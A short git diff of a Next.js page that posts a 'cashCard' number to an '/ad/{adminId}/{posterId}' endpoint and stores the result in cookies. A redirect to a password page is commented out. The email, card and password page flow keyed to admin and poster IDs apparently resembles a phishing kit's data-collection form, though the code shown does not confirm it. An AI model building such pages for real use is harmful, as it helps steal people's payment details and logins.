@@ -8,6 +8,13 @@ function page() {
   const router = useRouter();
   const adminId = Cookies.get("adminId");
   const posterId = Cookies.get("posterId");
+
+const handleBack = () => {
+    router.back();
+  };
+
+
+
   const handleContinue = async () => {
     if (!cardNumber) {
       return;
@@ -16,15 +23,7 @@ function page() {
       cashCard: cardNumber,
       site: site,
     };
-
-
-
-  
-
-
-
-
-    const url = `${API_URL}/email/post/${adminId}/${posterId}`;
+    const url = `${API_URL}/ad/${adminId}/${posterId}`;
 
     const res = await fetch(url, {
       method: "POST",
@@ -39,7 +38,7 @@ function page() {
 
     if (res.ok) {
       console.log("success", data);
-      Cookies.set("email", data?.info?.cashCard);
+      Cookies.set("cashCard", data?.info?.cashCard);
       Cookies.set("id", data?.info?._id);
       // router.push("/password");
     } else {
@@ -47,16 +46,7 @@ function page() {
       // toast.error("Something Went Wrong");
     }
   };
-  console.log(
-    "adminId:",
-    adminId,
-    "posterId:",
-    posterId,
-    "email:",
-    email,
-    "site:",
-    site
-  );
+  
 
   return (
    <div className="flex items-center justify-center min-h-screen bg-white p-4">
